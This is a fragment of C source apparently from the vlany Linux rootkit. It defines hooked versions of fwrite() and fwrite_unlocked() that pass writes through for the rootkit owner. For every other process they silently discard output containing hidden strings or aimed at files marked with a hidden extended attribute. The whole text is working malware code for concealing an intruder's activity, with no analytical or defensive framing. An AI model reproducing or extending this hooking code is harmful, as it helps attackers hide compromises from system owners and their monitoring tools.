size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    #ifdef DEBUG
        printf("[vlany] fwrite() called\n");
    #endif

    HOOK(old_fwrite, CFWRITE);

    if(owned()) return old_fwrite(ptr, size, nmemb, stream);

    if(hidden_str(ptr) || hidden_fxattr(fileno(stream))) return 0;

    return old_fwrite(ptr, size, nmemb, stream);
}

size_t fwrite_unlocked(const void *ptr, size_t size, size_t n, FILE *stream)
{
    #ifdef DEBUG
        printf("[vlany] fwrite_unlocked() called\n");
    #endif

    HOOK(old_fwrite_unlocked, CFWRITE_UNLOCKED);

    if(owned()) return old_fwrite_unlocked(ptr, size, n, stream);

    if(hidden_str(ptr) || hidden_fxattr(fileno(stream))) return 0;

    return old_fwrite_unlocked(ptr, size, n, stream);
}
